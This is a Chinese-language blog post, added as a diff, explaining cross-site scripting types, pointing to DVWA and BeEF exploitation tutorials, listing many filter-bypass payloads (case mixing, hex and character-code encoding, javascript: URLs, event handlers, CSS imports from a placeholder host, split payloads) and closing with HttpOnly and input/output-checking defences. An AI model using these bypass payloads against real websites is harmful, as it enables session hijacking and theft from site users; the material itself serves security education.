@@ -1,0 +1,208 @@
+---
+layout: post
+title:  "网络安全－XSS"
+categories: 网络安全
+tags: 网络安全 XSS
+author: xueyp
+description: XSS原理及介绍
+---
+
+跨站脚本攻击XSS
+============
+
+  跨站脚本攻击XSS（Cross Site Script）,。它是指恶意攻击者在web页面当中插入恶意的html代码，当用户浏览该页面时，嵌入其中Web页面里面的HTML代码就会执行，从而达到恶意用户的特殊目的。
+
+XSS攻击可以分为两大类：
+
+**非持久性XSS攻击**：非持久性XSS攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。
+
+**持久型XSS攻击**：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。
+
+另外XSS也可以分为三类：
+
+**反射型**：经过后端，不经过数据库。
+
+**存储型**：经过后端，经过数据库。
+
+**DOM型**：不经过后端，DOM-based XSS 漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。
+
+漏洞实验和利用
+============
+- 实验
+具体实验可参考：[dvwa实验](http://www.hackingarticles.in/xss-exploitation-dvwa-bypass-security/)
+
+- 利用
+
+通过 XSS 来获得用户 Cookie 或其他有用信息，利用平台负责接收并保存这些信息。
+
+XSS利用平台有如XSS Shell, BeEF, Anehta, CAL9000。
+[xss利用教程](https://www.hacking-tutorial.com/hacking-tutorial/xss-attack-hacking-using-beef-xss-framework/)
+
+XSS过滤绕过技巧
+============
+**改变大小写**
+```
+<script>alert(“xss”);</script>可以转换为：
+
+<ScRipt>ALeRt(“XSS”);</sCRipT>
+```
+**关闭标签**
+```
+“><script>alert(“Hi”);</script>
+```
+**使用hex编码绕过**
+```
+<script>alert(“xss”);</script>可以转换为：
+
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e
+```
+**绕过magic_quotes_gpc**
+```
+magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如’(单引号)转换为\’，”(双引号)转换为\”，\转换为\\
+
+比如：<script>alert(“xss”);</script>会转换为<script>alert(\”xss\”);</script>,这样我们的xss就不生效了。
+
+针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为
+
+String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)
+
+那么我们的XSS语句就变成了
+
+<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)</script>
+
+String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。
+
+最后使用<script>转换后的放到这里</script>包含即可。
+```
+**利用"<>"标记注射Html/Javascript**
+```
+如果用户能随心所欲引入<>标记，那他就能操作HTML标记，然后就能通过<script>标签插入JS恶意脚本了，例如：
+
+<script>alert(‘XSS‘);</script>
+
+当然如果对"<>"和script等进行了过滤，上面这个就无法执行了
+利用HTML标签属性值执行XSS
+
+很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如：
+
+<img src = "javascript:alert(‘xss‘);">
+
+这里即便对传入的参数过滤了<>,XSS还是能发生(前提是该标签属性需要引用文件)
+```
+**空格/回车/Tab**
+```
+假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：
+
+　<img src= "java　　script:alert(‘xss‘);" width=100>
+
+这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略.
+
+而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。
+
+像<img src= "javascript:　alert(/xss/); width=100> 同样能绕过.
+**对标签属性值进行转码**
+
+过滤严谨的函数很可能对标签也进行了严格的控制，但是如果用其他形式表示标签,脚本仍能解析却可以绕过过滤.
+
+常见的编码方式有：HTML实体编码(&#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(...)绕过.
+
+因此<img src= "javascript&#116&#alert(/xss/);">可以实现绕过.
+
+另外还可以把&#01、&#02、&#09等字符插入代码的头部或任意地方
+```
+**产生自己的事件**
+```
+如果不能依靠属性进行跨站，那么还可以利用事件处理函数
+<input type = "button"  value = "clickme" onclick="alert(‘click me‘)" />
+
+事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数.
+```
+**利用CSS跨站剖析**
+```
+之所以说CSS样式表是个很不错的载体，是因为CSS不需要嵌入到HTML代码中，可以直接从文件或其他地方进行引用. 另外CSS同样隐蔽、灵活，不过不同
+
+浏览器之间不能通用，如：
+
+<div style = "list-style-image:url(javascript:alert(‘xSS‘))">
+
+<link rel = "stylesheet" href ="http://www.xxx.com/atack.css">
+
+<style type=‘text/css‘>@import url(http://www.xxx.com/xss.css);</style>
+
+<style>@import ‘javascript:alert(‘xss‘);‘</style>
+```
+**绕过过滤规则**
+```
+大小写混用：<iMgSRC = "JavaScript:alert(0);">
+
+不使用引号或者构造全角字符也能扰乱过滤规则
+
+还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：
+
+<img src ="java/*javascript:alert(‘xss‘)*/script:alert(1);">
+```
+**充分利用字符编码**
+```
+上面说到过编码，这里加以补充，除了像&#ASCII，其实也可以采用&#0、&#00、&#000等形式，同样&#x6a的形式也是可以的
+
+<script>eval("\61\6c\65......");<script>
+
+如果使用eval执行10进制形式的脚本则需要配合string.fromcharcode()使用
+```
+**拆分跨站法**
+```
+拆分跨站就是像shellcode一样，遇到长度限制不能按正常方式跨站时，通过引入变量多次提交将之连接起来实现跨站，例如：
+
+<script>z=‘document.‘</script>
+
+<script>z=+‘write‘("‘</script>
+
+<script>z=z+‘<script‘</script>
+
+......
+
+<script>eval(z)</script>
+
+另外除了像上面多次提交，也可以引用其他变量如：eval(qUserInfo.spaceName)形式，由于qUserInfo.spaceName是可控变量，因此改变其值就可以绕过长度限制了
+```
+
+XSS防御
+============
+- HttpOnly
+
+　　HttpOnly最早是由微软提出的，并在IE6中实现的，至今已经成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。
+
+　　严格的说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的cookie劫持攻击。
+
+　　一个cookie的使用过程如下：
+
+Step1:浏览器向服务器发送请求，这时候没有cookie
+
+Step2：服务器返回时发送set-cookie头，向客户端浏览器写入cookie。
+
+Step3：在该cookie到期前，浏览器访问该域下的所有页面，都将发送该cookie。
+
+　　需要注意的是，服务器可能会设置多个cookie（多个key-value对），而HttpOnly可以有选择性地加在任何一个Cookie值上。
+
+　　在某些时候，应用可能需要JavaScript访问某几项cookie，这种cookie可以不设置HttpOnly标记；而仅把HttpOnly标记给用于认证的关键cookie。
+
+　　但是HttpOnly不是万能的，添加了HttpOnly不等于解决了XSS问题。
+- 输入检查
+
+　　输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前web开发的普遍做法是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。
+
+　　在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊的字符，比如<、>、’、”、等等。如果发现存在特殊字符，则将这些特殊字符过滤或者编码。
+
+　　比较睿智的“输入检查”可能还会匹配XSS的特征。比如查找用户数据是否包含了“<script>”、“JavaScript”等敏感字符。
+
+- 输出检查
+
+　　对于变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击。
+
+参考
+============
+[XSS](https://www.google.com.hk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=12&cad=rja&uact=8&ved=0ahUKEwjL-qnlgtDbAhUHoYMKHfTUDlIQFghbMAs&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-site_scripting&usg=AOvVaw3QwxlZQaJRMyjJYH2CoPIu)
+[BeEF](https://github.com/beefproject/beef/wiki)
+
+
+版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
